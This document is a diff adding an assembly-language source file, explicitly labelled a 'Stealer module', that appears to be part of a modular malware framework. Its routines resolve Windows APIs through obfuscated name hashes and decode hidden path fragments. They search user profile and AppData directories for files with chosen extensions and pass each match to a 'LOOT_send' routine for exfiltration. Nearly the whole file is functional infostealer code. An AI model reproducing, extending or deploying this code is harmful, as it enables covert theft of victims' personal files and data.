@@ -1,0 +1,507 @@
+#!name##ZAX_gyp_mod
+#!types##sfile
+#!info##Stealer module
+
+
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+extern GetLastError
+
+
+%define GYPSY_BUFFER_FILE_PATH {{ZAX_fpath_buff}}  ; length file path buffer
+%define GYP_ENCODE_HEX_PATH {{ZAX_path_hex}}
+%define GYP_BUFF_PART_PATH {{ZAX_fpath_buff}}
+
+section .data
+    gyp_text_ff: db "Find File: %s", 10, 0
+    gyp_text_nf: db "ERROR: File not finded", 10, 0
+    gyp_text_eid: db "ERROR: %d", 10, 0
+    gyp_text_out: db "OUT: %s", 10, 0
+    gyp_text_nnf: db "Find All", 10, 0
+    gyp_test_dir: db "C:\Users\xxx\Documents", 0
+
+
+{{TOOL.nasm_make_var(ZAX_grab_fext, "gyp_fext", "gyp_fext_all")}}
+    
+    gyp_player_fff: dd {{TOOL.AsmSh_encode("FindFirstFileA")}} ; FindFirstFileA
+    gyp_player_fnf: dd {{TOOL.AsmSh_encode("FindNextFileA")}} ; FindNextFileA
+    gyp_player_pca: dd {{TOOL.AsmSh_encode("PathCombineA")}} ; PathCombineA
+    gyp_player_sdl: dd {{TOOL.AsmSh_encode("Shlwapi.dll")}} ; Shlwapi.dll
+    gyp_player_gev: dd {{TOOL.AsmSh_encode("GetEnvironmentVariableA")}} ; GetEnvironmentVariableA
+
+    gyp_mplayer1: db "APPDATA", 0
+    gyp_mplayer2: db "LOCALAPPDATA", 0
+    gyp_mplayer3: db "HOMEDRIVE", 0
+    gyp_mplayer4: db "USERPROFILE", 0
+    
+    gyp_mplayer_all: dq gyp_mplayer1, gyp_mplayer2, gyp_mplayer3, gyp_mplayer4, 0
+
+{{TOOL.nasm_make_hex_var(ZAX_grab_path, "gyp_ppath", "gyp_ppath_all", ZAX_path_hex)}}
+
+    
+    gyp_text_work: db "Scanner still working", 10, 0
+    gyp_find_data_struct: times 592 db 0    ; buffer for find_data struct
+
+    
+{% set _ = TOOL.AsmSh_reset_table() %}   
+
+section .bss
+    gyp_buff_fpath: resb GYPSY_BUFFER_FILE_PATH     ; main buffer path
+    gyp_buff_temp_fpath: resb GYPSY_BUFFER_FILE_PATH     ; temp buffer file path
+    gyp_scan_FLAG: resb 1   ; GYP_scan_dir FLAG
+    gyp_handle_sf: resq 1   ; search handle
+    gyp_pl_fff: resq 1      ; FindFirstFileA
+    gyp_pl_fnf: resq 1      ; FindNextFileA
+    gyp_pl_pca: resq 1      ; PathCombineA
+    gyp_pl_gev: resq 1      ; GetEnvironmentVariableA
+    gyp_tmp_mp: resq 1      ; temp for pointer
+    gyp_buff_path: resb GYP_BUFF_PART_PATH    ; buffer for decoded part path
+    gyp_buff_evar: resb GYP_BUFF_PART_PATH  ; buffer for env variable path
+    gyp_buff_part_path: resb GYP_BUFF_PART_PATH ; buffer for part path
+
+section .text
+
+%macro MACRO_CMD_decode_path 1
+; decode hex byte
+    push r12
+    xor r12, r12
+    %%loop:
+        cmp r12, GYP_ENCODE_HEX_PATH
+        je %%end
+        dec %1
+        inc r12
+        jmp %%loop
+    
+    %%end:
+        pop r12
+
+%endmacro
+
+GYP_steal_life:
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    push r12
+    push r13
+    push r14
+    push r15
+    
+    xor r12, r12    ; part path index
+    
+    .main_loop:
+        xor r13, r13    ; env var index
+        lea rbx, [gyp_ppath_all]
+        mov qword rcx, [rbx + 8 * r12]
+        cmp rcx, 0
+        je .end_main
+        sub rsp, 40
+        call GYP_decode_path
+        add rsp, 40
+        .env_var_loop:
+            lea rbx, [gyp_mplayer_all]
+            mov qword rdx, [rbx + 8 * r13]
+            cmp rdx, 0
+            je .env_var_end
+            sub rsp, 40
+            lea rcx, [gyp_buff_path]
+            call GYP_merge_path
+            add rsp, 40
+            cmp rax, 0
+            je .env_var_inc
+            sub rsp, 40
+            mov rcx, rax
+            call GYP_find_player
+            add rsp, 40
+            .env_var_inc:
+                inc r13
+                jmp .env_var_loop
+        .env_var_end:
+            inc r12
+            jmp .main_loop
+    
+    
+    
+    .return:
+        pop r15
+        pop r14
+        pop r13
+        pop r12
+        add rsp, 8
+        pop rbp
+        ret
+    
+    .end_main:
+        jmp .return
+
+GYP_merge_path:
+; merge part path
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - decoded file path
+; IN: rdx - env variable tag. ex "APPDATA"
+; OUT: rax - pointer to path or "0"
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; file path
+    mov [rbp-16], rdx   ; env var
+    
+    ;clear buffer
+    lea rdi, [gyp_buff_part_path]
+    mov rcx, GYP_BUFF_PART_PATH
+    xor rax, rax
+    cld
+    rep stosb
+    
+    ; get env var
+    sub rsp, 40
+    mov rcx, [rbp-16]
+    lea rdx, [gyp_buff_evar]
+    mov r8, GYP_BUFF_PART_PATH
+    lea rax, [gyp_pl_gev]
+    mov rax, [rax]
+    call rax    ; call GetEnvironmentVariableA
+    add rsp, 40
+    cmp rax, 0
+    je .return_null
+    
+    ; merge path
+    sub rsp, 40
+    lea rcx, [gyp_buff_part_path]
+    lea rdx, [gyp_buff_evar]
+    mov r8, [rbp-8]
+    lea rax, [gyp_pl_pca]
+    mov rax, [rax]
+    call rax    ; call PathCombineA
+    mov rcx, text_out
+    mov rdx, rax
+    call printf
+    add rsp, 40
+    
+    lea rax, [gyp_buff_part_path]   ; return pointer to path
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .return_null:
+        xor rax, rax
+        jmp .return
+
+
+GYP_decode_path:
+; decode part file path
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - encoded file path
+; OUT: rax - pointer to decoded path
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    mov [rbp-8], rcx    ; encoded file path
+    
+    ;clear buffer
+    lea rdi, [gyp_buff_path]
+    mov rcx, GYP_BUFF_PART_PATH
+    xor rax, rax
+    cld
+    rep stosb
+    
+    xor rax, rax    ; counter
+    xor rcx, rcx
+    mov rsi, [rbp-8]
+    lea rdi, [gyp_buff_path]
+    .decode:
+        mov byte cl, [rsi + rax]
+        cmp cl, 0
+        je .decode_end
+        MACRO_CMD_decode_path cl
+        mov byte [rdi + rax], cl
+        inc rax
+        jmp .decode
+   
+    .decode_end:
+        lea rax, [gyp_buff_path]    ; return pointer
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+
+
+        
+
+GYP_Init:
+; Initialize module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, gyp_player_fff
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [gyp_pl_fff]
+    mov [rbx], rax  ; save FindFirstFileA addr
+    
+    mov rcx, gyp_player_fnf
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [gyp_pl_fnf]
+    mov [rbx], rax  ; save FindNextFileA addr
+    
+    mov rcx, gyp_player_pca
+    mov rdx, gyp_player_sdl
+    call PITF_get
+    lea rbx, [gyp_pl_pca]
+    mov [rbx], rax  ; save PathCombineA addr
+    
+    mov rcx, gyp_player_gev
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [gyp_pl_gev]
+    mov [rbx], rax  ; save GetEnvironmentVariableA
+    add rsp, 40
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+GYP_find_player:
+; scans directory for files
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - directory name
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    mov [rbp-8], rcx    ; dir name
+    
+    ; check FLAG
+    lea rdx, [gyp_scan_FLAG]
+    xor rcx, rcx
+    mov byte cl, [rdx]
+    cmp cl, 0
+    jne .error_flag
+    
+    ;set FLAG
+    lea rdx, [gyp_scan_FLAG]
+    mov byte [rdx], 1
+    
+    
+    ; file ext
+    xor r15, r15    ; counter
+    sub rsp, 40
+    .fext_loop:
+        lea rdx, [gyp_fext_all] 
+        mov rdx, [rdx + r15 * 8]    ; get next entry on gyp_fext_all list
+        cmp rdx, 0
+        je .fext_end
+        mov rcx, [rbp-8]
+        call GYP_find_item
+        inc r15
+        jmp .fext_loop
+
+    .fext_end:
+    add rsp, 40
+    
+    
+    ; reset FLAG
+    lea rdx, [gyp_scan_FLAG]
+    mov byte [rdx], 0
+    
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+     
+     .error_flag:
+        sub rsp, 40
+        mov rcx, gyp_text_work
+        call TCP_send
+        add rsp, 40
+        jmp .return
+
+GYP_FindItem:
+; scans the directory for files
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - args struct (4 * 8 bytes)
+    push rbp
+    mov rbp, rsp
+    
+    mov rax, rcx
+    
+    sub rsp, 48
+    mov rcx, [rax + 8]
+    mov rdx, [rax + 16]
+    call GYP_find_item
+    add rsp, 48
+    
+    
+    pop rbp
+    ret
+
+
+GYP_find_item:
+; scans the directory for files
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - directory name
+; IN: rdx - file extension. ex: "*.jpg"
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; dir name
+    mov [rbp-16], rdx   ; file ext
+    mov [rbp-24], r15   ; save r15
+    
+    ; check FLAG
+    
+    ;clear buffer
+    .clear_buffer:
+        lea rdi, [gyp_buff_fpath]
+        mov rcx, GYPSY_BUFFER_FILE_PATH
+        xor rax, rax
+        cld
+        rep stosb
+    
+    ; find first file:
+    .find_first:
+        sub rsp, 40
+        lea rcx, [gyp_buff_fpath]
+        mov rdx, [rbp-8]
+        mov r8, [rbp-16]
+        lea rax, [gyp_pl_pca]
+        mov rax, [rax]
+        call rax    ; call PathCombineA
+        add rsp, 40
+        
+        sub rsp, 40
+        mov rcx, gyp_text_out
+        lea rdx, [gyp_buff_fpath]
+        call printf
+        add rsp, 40
+        
+        sub rsp, 40
+        lea rcx, [gyp_buff_fpath]
+        lea rdx, [gyp_find_data_struct]
+        lea rax, [gyp_pl_fff]
+        mov rax, [rax]
+        call rax    ; call FindFirstFileA
+        add rsp, 40
+        cmp rax, -1
+        je .not_find
+        
+        ;save search handle
+        lea rbx, [gyp_handle_sf]
+        mov qword [rbx], rax
+        
+          
+        sub rsp, 40
+        mov rcx, [rbp-8]
+        call GYP_make_abs_fpath
+        add rsp, 40
+               
+        sub rsp, 40
+        mov rcx, gyp_text_ff
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        
+        ;send file
+        sub rsp, 40
+        lea rcx, [gyp_buff_temp_fpath]
+        call LOOT_send
+        add rsp, 40
+    
+    .find_next:
+        sub rsp, 40
+        lea rcx, [gyp_handle_sf]
+        mov rcx, [rcx]
+        lea rdx, [gyp_find_data_struct]
+        lea rax, [gyp_pl_fnf]
+        mov rax, [rax]
+        call rax    ; call FindNextFileA
+        add rsp, 40
+        cmp rax, 0
+        je .not_next
+        
+        sub rsp, 40
+        mov rcx, [rbp-8]
+        call GYP_make_abs_fpath
+        add rsp, 40
+               
+        sub rsp, 40
+        mov rcx, gyp_text_ff
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        
+        ;send file
+        sub rsp, 40
+        lea rcx, [gyp_buff_temp_fpath]
+        call LOOT_send
+        add rsp, 40
+        
+        jmp .find_next
+        
+        
+    
+    .return:
+        mov r15, [rbp-24]   ; restore r15
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .not_find:
+        sub rsp, 40
+        mov rcx, gyp_text_nf
+        call printf
+        call GetLastError
+        mov rcx, gyp_text_eid
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        jmp .return
+     
+     .not_next:
+        sub rsp, 40
+        mov rcx, gyp_text_nnf
+        call printf
+        add rsp, 40
+        jmp .return
+
+
+GYP_make_abs_fpath:
+; make abs file path
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - dir path
+; OUT: rax - pointer to buffer with abs file path
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    mov rbx, rcx    ; move fpath
+    
+    ;reset buffer
+    lea rdi, [gyp_buff_temp_fpath]
+    mov rcx, GYPSY_BUFFER_FILE_PATH
+    xor rax, rax
+    cld
+    rep stosb
+    
+    sub rsp, 40
+    lea rcx, [gyp_buff_temp_fpath]
+    mov rdx, rbx
+    lea r8, [gyp_find_data_struct + 44] ;get file name from struct
+    lea rax, [gyp_pl_pca]
+    mov rax, [rax]
+    call rax    ; call PathCombineA
+    add rsp, 40
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+
